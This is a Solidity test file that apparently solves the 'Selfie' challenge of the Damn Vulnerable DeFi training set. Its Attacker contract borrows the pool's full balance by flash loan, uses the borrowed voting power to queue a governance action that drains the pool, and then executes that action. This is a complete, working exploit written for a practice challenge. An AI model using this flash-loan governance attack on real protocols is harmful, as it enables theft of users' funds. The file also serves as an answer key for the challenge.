// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {
    IERC3156FlashBorrower
} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract Attacker is IERC3156FlashBorrower {
    SelfiePool public pool;
    IERC20 public token;
    SimpleGovernance public governance;
    address public recovery;
    uint256 public actionId;

    constructor(
        address _pool,
        address _token,
        address _governance,
        address _recovery
    ) {
        pool = SelfiePool(_pool);
        token = IERC20(_token);
        governance = SimpleGovernance(_governance);
        recovery = _recovery;
    }
    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            ""
        );
    }
    function onFlashLoan(
        address initiator,
        address _token, //
        uint256 amount, //
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "not pool");
        require(initiator == address(this), "not attacker");
        DamnValuableVotes(address(token)).delegate(address(this));
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );
        IERC20(_token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    Attacker attacker;
    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }
    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);
        // Deploy governance contract
        governance = new SimpleGovernance(token);
        // Deploy pool
        pool = new SelfiePool(token, governance);
        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }
    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        attacker = new Attacker(
            address(pool),
            address(token),
            address(governance),
            recovery
        );
        attacker.attack();
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(attacker.actionId());
    }
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}
